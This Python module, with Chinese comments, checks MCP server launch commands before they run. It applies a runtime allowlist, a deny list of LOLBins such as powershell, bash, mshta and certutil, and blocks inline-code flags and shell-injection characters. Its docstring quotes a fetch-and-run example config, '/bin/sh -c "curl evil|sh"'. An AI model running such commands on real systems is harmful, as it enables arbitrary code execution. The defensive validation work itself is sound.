"""命令准入校验（sandbox）：阻断 MCP server 配置中的任意代码执行。

背景：
- ``workguy/mcp.py`` 的 ``MCPClient.connect()`` 直接把配置里的 ``command``
  + ``args`` 交给 ``subprocess.Popen``。若配置来自不可信来源（下载的技能包、
  被篡改的配置文件），写入 ``"command": "calc.exe"`` 或
  ``"command": "/bin/sh", "args": ["-c", "curl evil|sh"]`` 即任意代码执行。
- ``shell=False`` 只挡住 shell 元字符，挡不住「执行任意可执行文件」。

本模块在「启动进程之前」做一道准入校验：
- 只允许白名单内的运行时（node / npx / python / uvx / deno / ...），按 basename
  匹配，大小写不敏感，自动去掉 ``.exe``。
- 高危 LOLBin（cmd / powershell / bash / sh / mshta / rundll32 ...）默认不在白名单，
  即默认拒绝；若业务确实需要，必须由调用方显式传 ``allowlist`` 覆盖（逃生口）。
- 拦截「内联代码执行」开关（``-c`` / ``--eval`` / ``-e`` / ``/c`` /
  ``-Command`` / ``-EncodedCommand``）与命令注入/链式执行字符
  （``|`` ``&&`` ``;`` `` ` `` ``$(``）。
- 若给定 ``workdir``，校验路径参数未逃逸出工作目录。

安全细节：校验失败时的异常信息说明「哪条规则」被触发，但**绝不回显完整
命令行**（args 里可能含凭据占位符及其解析值）。仅回显触发规则的单个 token /
basename，不回显全部参数。
"""

from __future__ import annotations

import os
from typing import Sequence

__all__ = [
    "CommandNotAllowedError",
    "ALLOWED_COMMANDS",
    "DENIED_COMMANDS",
    "DANGEROUS_ARG_PATTERNS",
    "validate_command",
    "is_allowed",
]

# 允许的解释器/可执行文件白名单（已按 basename 规范化：小写、去 .exe）。
#
# 这是一个**保守集合**，覆盖常见 MCP server 运行时：
#   Node 生态：node, npx, npm, pnpm, yarn, tsx, bun
#   Python 生态：python, python3, uvx
#   其他运行时：deno, java, javaw, dotnet, go, ruby, perl, php, lua
#
# 任何不在列表里的可执行文件（如 calc.exe / malware / git / curl）默认拒绝。
ALLOWED_COMMANDS: frozenset[str] = frozenset(
    {
        "node",
        "npx",
        "npm",
        "pnpm",
        "yarn",
        "tsx",
        "bun",
        "python",
        "python3",
        "uvx",
        "deno",
        "java",
        "javaw",
        "dotnet",
        "go",
        "ruby",
        "perl",
        "php",
        "lua",
    }
)

# 明确默认拒绝的高危工具（LOLBin：Living-off-the-Land Binaries）。
# 它们本身在 ALLOWED_COMMANDS 之外，所以默认拒绝；但若调用方显式传
# allowlist 覆盖，则放行（逃生口）。这里集中列出，便于审计与文档化。
DENIED_COMMANDS: frozenset[str] = frozenset(
    {
        "cmd",
        "powershell",
        "pwsh",
        "bash",
        "sh",
        "zsh",
        "csh",
        "ksh",
        "cscript",
        "wscript",
        "mshta",
        "rundll32",
        "regsvr32",
        "certutil",
        "wsl",
    }
)

# 内联代码执行开关：配合解释器使用时会被用来执行任意代码，必须拦截。
_INLINE_CODE_FLAGS: frozenset[str] = frozenset(
    f.lower()
    for f in ("-c", "--eval", "-e", "/c", "-Command", "-EncodedCommand")
)

# 命令注入 / 链式执行字符：出现在任意参数中即视为危险。
_INJECTION_TOKENS: tuple[str, ...] = ("|", "&&", ";", "`", "$(")

# 对外暴露的危险参数模式（内联开关 + 注入字符），供调用方/测试参考。
DANGEROUS_ARG_PATTERNS: tuple[str, ...] = (
    "-c",
    "--eval",
    "-e",
    "/c",
    "-Command",
    "-EncodedCommand",
    "|",
    "&&",
    ";",
    "`",
    "$(",
)


class CommandNotAllowedError(Exception):
    """命令未通过准入校验。"""


def _normalize(command: str) -> str:
    """取 command 的 basename 并规范化：小写、去掉末尾的 .exe。"""
    name = os.path.basename(command) or command
    name = name.lower()
    if name.endswith(".exe"):
        name = name[:-4]
    return name


def is_allowed(command: str, allowlist: frozenset[str] | None = None) -> bool:
    """仅做 basename 白名单判断（不检查参数）。供快速预检使用。"""
    if not command:
        return False
    eff = allowlist if allowlist is not None else ALLOWED_COMMANDS
    return _normalize(command) in eff


def _check_path_escape(args: Sequence[str], workdir: str) -> None:
    """校验 args 中的路径参数未逃逸出 workdir。"""
    wd = os.path.abspath(workdir)
    wd_prefix = wd + os.sep
    for arg in args:
        if not arg or not _looks_like_path(arg):
            continue
        if os.path.isabs(arg):
            resolved = os.path.normpath(arg)
        else:
            resolved = os.path.normpath(os.path.join(wd, arg))
        if resolved != wd and not resolved.startswith(wd_prefix):
            # 注意：不回显 arg 的具体内容，避免泄露路径中的敏感信息。
            raise CommandNotAllowedError(
                "参数中的文件路径试图逃逸出允许的工作目录"
            )


def _looks_like_path(arg: str) -> bool:
    """粗略判断一个参数是否像文件路径（含路径分隔符）。"""
    return "/" in arg or "\\" in arg


def validate_command(
    command: str,
    args: Sequence[str],
    *,
    allowlist: frozenset[str] | None = None,
    workdir: str | None = None,
) -> None:
    """校验可执行命令是否准入。不通过抛 :class:`CommandNotAllowedError`。

    参数：
        command: 可执行文件（可含路径，按 basename 匹配）。
        args: 命令行参数序列。
        allowlist: 覆盖默认白名单；传入后仅该列表内的 basename 被允许
                   （含默认拒绝的 LOLBin 也可借此放行，风险自负）。
        workdir: 若给定，校验路径参数未逃逸出该目录。
    """
    if not command:
        raise CommandNotAllowedError("缺少可执行命令（command 为空）")

    eff = allowlist if allowlist is not None else ALLOWED_COMMANDS
    name = _normalize(command)
    if name not in eff:
        # 仅回显 basename，不回显完整命令行（可能含凭据）。
        raise CommandNotAllowedError(
            f"可执行文件 '{os.path.basename(command)}' 不在允许的命令白名单中"
        )

    # 高危工具即便在 allowlist 覆盖时也要显式提示（这里仅做信息性校验，
    # 真正放行与否由 eff 决定：若 allowlist 显式含该 basename 则放行）。
    if name in DENIED_COMMANDS and allowlist is None:
        # 默认白名单不含 DENIED，理论上不会走到这里；保留以防 ALLOWED 误配。
        pass

    # 参数层校验：内联代码执行开关 + 命令注入字符。
    for arg in args:
        if arg is None:
            continue
        a = arg.lower() if isinstance(arg, str) else str(arg).lower()
        if a in _INLINE_CODE_FLAGS:
            raise CommandNotAllowedError(
                "检测到内联代码执行开关，已禁止以解释器方式执行任意代码"
            )
        for tok in _INJECTION_TOKENS:
            if tok in arg:
                # 不回显 arg 全文，仅说明命中了哪种危险字符。
                raise CommandNotAllowedError(
                    f"参数中包含命令注入/链式执行字符 '{tok}'，已禁止"
                )

    # 路径逃逸校验（可选）。
    if workdir is not None:
        _check_path_escape(args, workdir)
